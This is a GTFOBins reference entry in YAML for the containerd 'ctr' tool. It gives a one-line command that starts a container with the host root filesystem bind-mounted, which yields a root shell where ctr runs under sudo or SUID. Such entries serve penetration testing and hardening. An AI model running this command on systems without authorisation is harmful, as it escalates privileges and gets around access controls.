<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/ctr -->
---
functions:
  shell:
  - code: |-
      ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
    comment: |-
      An image must be already present, for example:

      ```
      ctr images pull docker.io/library/alpine:latest
      ```
    contexts:
      sudo:
      suid:
...
